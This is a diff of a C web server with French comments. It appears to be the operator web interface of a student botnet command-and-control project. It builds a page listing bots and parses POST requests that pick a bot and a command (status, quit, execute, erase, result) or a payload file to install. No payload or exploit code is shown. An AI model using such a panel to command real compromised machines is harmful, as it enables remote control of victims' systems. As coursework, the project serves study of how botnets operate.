@@ -1,6 +1,3 @@
-
-/**** Minimal web server ****/
-
 /** Include files **/
 
 #include <stdio.h>
@@ -17,7 +14,8 @@
 #include <libnetwork.h>
 #include <errno.h>
 
-/** Some constants **/
+#include "serveur_web.h"
+/** quelques constantes **/
 
 #define WEB_DIR "./www"
 #define PAGE_NOTFOUND "error.html"
@@ -27,16 +25,17 @@
 #define CODE_NOTFOUND 404
 
 #define NB_BOTS 3
+
+//pour des besoins de tests on prepare une liste 
 char *ListeBot[3] = {"Bot1", "Bot2", "Bot3"};
 
-/* gestion des requêtes web 
-- prend en paramètre la socket de dialogue
-- met en place la file descriptor de cette socket afin de read-write dessus
-- 
 
+/**
+* Void page_acceuil(int nb_bots, char* ListeBot[])
+* Fonction qui utilise la liste des id de bots reçu du CC et le nombre de bots
+* La fonction va se charger de créer la page d'acceuil html
+* cette page d'acceuil nous permettra de faire nos commandes selon le bot souhaité
 */
-
-
 void page_acceuil(int nb_bots, char* ListeBot[])
 {
     FILE *acceuil = fopen("www/acceuil.html", "w");
@@ -71,6 +70,20 @@ void page_acceuil(int nb_bots, char* ListeBot[])
     fclose(acceuil);
 }
 
+/**
+ * char* extraction(char* chaine, int stop, const char* delim)
+ * la fonction utilise une chaine dans laquelle on va extraire un sous chaine
+ * le parametre delim est le delimiteur qui nous permet de couper la chaine
+ * le parametre stop constitue le nombre de découpes avant de s'arrêter
+ * 
+ * la fonction retourne la sous-chaine extraite
+ * 
+ * cette fonction nous est particulièrement utile pour :
+ * extraire de la requete post le nom du fichier
+ * extraire de la requete post le nom du bot (son id)
+ * extraire de la requete post le type de commande
+*/
+
 char* extraction(char* chaine, int stop, const char* delim){
         int i = 0;
         char* temp = strtok(chaine, delim);
@@ -85,6 +98,14 @@ char* extraction(char* chaine, int stop, const char* delim){
     return temp;
 }
 
+/** void gestionClientWeb(void *s)
+* prend en paramètre la socket de dialogue
+* elle crée un file descriptor de la socket de dialogue
+* ainsi elle va nous permet de recupérer les requetes GET ou POST
+* Selon le type de requete, elle va lancer le traitement adéquat
+* le detail des commentaires pour le traitement est à voir plus bas dans le code
+*/
+
 void gestionClientWeb(void *s)
 {
 
@@ -95,6 +116,7 @@ void gestionClientWeb(void *s)
     char path[MAX_BUFFER];
     char type[MAX_BUFFER];
 
+    //on prepare les receptacle des sous-chaines à extraire
     char* Bot;
     char* Charge;
     char* Commande;
@@ -109,15 +131,6 @@ void gestionClientWeb(void *s)
         exit(EXIT_FAILURE);
     }
 
-    //PageWeb d'acceuil chargée dynamiquement créant les bouton
-    // Pour chaque bot présent dans la liste
-
-    //char liste[MAX_BUFFER];
-    //while(fgets(liste,MAX_BUFFER,dialogue)!=NULL){
-
-    /* Termine la connexion */
-
-    //}
 
     //Gestion des requêtes POST et GET
 
@@ -152,10 +165,16 @@ void gestionClientWeb(void *s)
         donnees[content_length] = '\0';
     }
 
-    printf(" CONTENU DU FICHIER =%s\n",donnees);
+    printf(" CONTENU DU FICHIER =%s\n",donnees); //pour voir
     printf("fin de mon contenu\n");
 
-    //Différenciation du type de requete
+    /*Extraction des parametres concernant les commandes suivantes :
+    * Statut
+    * Quitter
+    * Executer
+    * Effacer
+    * Resultat
+    */
     if(donnees[0]=='B'){
         char *temp;
         int i = 0;
@@ -193,10 +212,15 @@ void gestionClientWeb(void *s)
         {
             printf("Erreur recupération commande\n");
         }
+        //fin de l'extraction, on afficher les paramètres
         printf("Le Bot est %s, la charge est %s, et la commande est %s\n", Bot, Charge, Commande);
         
 
     }
+
+    /*Sinon dans le cas de la commande d'installation d'une charge
+    * On extrait le nom du fichier et du bot concerné
+    */
     else{
         char* d1=malloc(content_length);
         char* d2=malloc(content_length);
@@ -209,14 +233,8 @@ void gestionClientWeb(void *s)
 
     
 
-    //printf("%ld", fread(buffer,strlen(buffer)+1, 1, dialogue));
-    // 1) faire un malloc de la longueur de ma page (content-length) qui doit etre
-    // en unsigned char
-    // 2) recupérer la longueur avec un fread(buffer,0,bytes,dialogue)
-    // si > 0 alors fficher
-
     // Traitement des réquêtes POST et GET : adapté du serveur web C minimal
-    // le traitement de la requêtes post a été rajouté.
+    // le traitement de la requête post a été rajouté.
     if (strcasecmp(cmd, "GET") == 0 || strcasecmp(cmd, "POST") == 0)
     {
         int code = CODE_OK;
@@ -258,7 +276,11 @@ void gestionClientWeb(void *s)
     fclose(dialogue);
 }
 
-// Juste pour rediriger vers la fonction gestClientWeb()
+
+/**void nouveauClientWeb(int dialogue)
+ * elle prend en paramètre la socket de dialogue
+ * elle lance la fonction gestionClientWeb()
+ */
 void nouveauClientWeb(int dialogue)
 {
 
@@ -266,26 +288,15 @@ void nouveauClientWeb(int dialogue)
     gestionClientWeb((void *)&dialogue);
 }
 
-/** Main procedure **/
+/** Procédure principale
+ * la page d'acceuil est constitué en fonction de la liste des bots
+ * puis boucleServeurTCP attend qu'on charge acceuil.html dans le navigateur
+ * les différents traitement peuvent commencer selon nos requetes
+ **/
 
 int main(void)
 {
 
-    /*FILE *acceuil = fopen("www/acceuil.html", "w");
-    if (acceuil != NULL)
-    {
-        //fprintf(dialogue,"HTTP/1.1 200 OK\n");
-        //fprintf(dialogue,"Content-Type: text/html;\n\n");
-        fprintf(acceuil, "<!DOCTYPE html>\n<html>\n<head>");
-        fprintf(acceuil, "<title> BOTS DISPONIBLES </title></head>");
-        fprintf(acceuil, "<body><h1 color:rgb(250,128,114)> BOTS </h1><h3>Groupe: Hind MALTI & Loris AHOUASSOU</h3>");
-        for (int i = 0; i < NB_BOTS; i++)
-        {
-            fprintf(acceuil, "<button onclick=\"document.location.href='formulaire.html';\"> %s </button>", ListeBot[i]);
-        }
-        fprintf(acceuil, "</body></html>");
-        fclose(acceuil);
-    }*/
     page_acceuil(3, ListeBot);
 
     // Serveur TCP + boucle serveur
